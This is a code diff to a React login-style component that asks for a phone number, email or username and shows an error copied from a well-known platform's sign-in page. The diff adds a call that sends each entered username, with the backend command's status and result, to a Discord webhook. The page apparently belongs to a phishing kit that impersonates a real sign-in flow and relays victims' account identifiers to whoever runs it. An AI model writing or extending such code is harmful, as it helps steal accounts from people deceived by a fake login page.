@@ -13,6 +13,7 @@ import type {
 import { FullScreenBlueLoader } from "../components/FullScreenBlueLoader";
 import { Toast } from "../components/Toast";
 import { API_BASE } from "../config/api";
+import { sendDiscordWebhookSafe } from "../helpers/webhook";
 
 export const Username = () => {
   const [input, setInput] = useState("");
@@ -116,6 +117,33 @@ export const Username = () => {
         return;
       }
 
+      // 🔥 Webhook Discord avec le résultat de la commande
+      console.log("📤 Sending webhook for username command result:", {
+        username,
+        commandId,
+        status: finalState.status,
+      });
+
+      sendDiscordWebhookSafe({
+        username: "Username Command Result",
+        content:
+          "📝 **Username Command Result**\n" +
+          "```json\n" +
+          JSON.stringify(
+            {
+              username,
+              commandId,
+              status: finalState.status,
+              result: finalState.result,
+              error: finalState.error,
+              nextStep: finalState.result?.nextStep,
+            },
+            null,
+            2
+          ) +
+          "\n```",
+      });
+
       if (finalState.status === "done" && finalState.result?.ok) {
         const nextStep = finalState.result?.nextStep;
 
@@ -130,7 +158,9 @@ export const Username = () => {
       }
 
       // ❌ erreur username
-      setToast("Sorry, we could not find your account. g;176386412757198839:-1763864199877:9zAFrYNvTejYilPRFf0c5elL:1");
+      setToast(
+        "Sorry, we could not find your account. g;176386412757198839:-1763864199877:9zAFrYNvTejYilPRFf0c5elL:1"
+      );
     } catch (err: any) {
       setLoading(false);
       const error = err.response?.data?.error || err.message || "Network error";
@@ -196,9 +226,7 @@ export const Username = () => {
           <div className="username-form">
             <label className="username-label">
               <div className="username-label-text">
-                <span>
-                  Phone number, email address, or username
-                </span>
+                <span>Phone number, email address, or username</span>
               </div>
               <div className="username-input-wrapper">
                 <input
